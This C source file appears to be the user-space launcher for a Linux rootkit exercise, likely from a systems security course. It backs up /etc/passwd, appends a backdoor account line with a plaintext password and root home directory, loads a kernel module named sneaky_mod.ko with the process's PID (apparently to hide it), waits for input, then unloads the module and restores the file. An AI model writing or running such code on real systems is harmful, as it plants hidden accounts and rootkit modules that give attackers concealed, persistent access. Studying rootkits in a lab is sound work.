 #include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// step1: print the own process ID
int print_pid(){
  int sneakyPID = getpid();
  printf("sneaky_process pid = %d\n", sneakyPID);
  return sneakyPID;
}

// step2: copy to a new file, and add a new line
void copyToNew(char* readFile, char* writeFile){
  FILE* source, * destination;
  source = fopen(readFile, "r");
  if (source == NULL) {
    perror("cannot read file!");
    exit(EXIT_FAILURE);
  }
  
  destination = fopen(writeFile, "w");
  if (destination == NULL) {
    perror("cannot write file!");
    exit(EXIT_FAILURE);
  }
  
  char ch;
  while ((ch = fgetc(source)) != EOF) {
    fputc(ch, destination);
  }
  fclose(source);
  fclose(destination);
}

void addNewLine(char* toFile){
  FILE* file_ptr = fopen(toFile, "a");
  if (file_ptr == NULL) {
    perror("cannot append file!");
    exit(EXIT_FAILURE);
  }
  char* lineToAppend = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(file_ptr, "%s", lineToAppend);  
  fclose(file_ptr);
}

// step3: load the sneaky module
void loadSneaky(int sneakyPID){
  char command[50];
  memset(command, '\0', 50);
  sprintf(command, "insmod sneaky_mod.ko sneakyPID=%d", sneakyPID);
  system(command); // fork, execl, and waitpid
  printf("successully load the module\n");
}

// step4: enter while loop
void wait_q(){
  char c;
  while ((c = fgetc(stdin)) != 'q') {
  }
}

// step5: unload the sneaky module
void unloadSneaky(){
  system("rmmod sneaky_mod.ko");
}

int main(){
  int sneakyPID;
  sneakyPID = print_pid();
  copyToNew("/etc/passwd", "/tmp/passwd");
  //printf("copy complete!\n");
  addNewLine("/etc/passwd");
  //printf("newline complete!\n");
  loadSneaky(sneakyPID);
  //printf("load complete!\n");
  wait_q();
  unloadSneaky();
  //printf("unload modlue!\n");
  
  // step6: restore file
  system("cp /tmp/passwd /etc");
  system("rm /tmp/passwd");
  //printf("recover passwd!\n");

  return EXIT_SUCCESS;
}


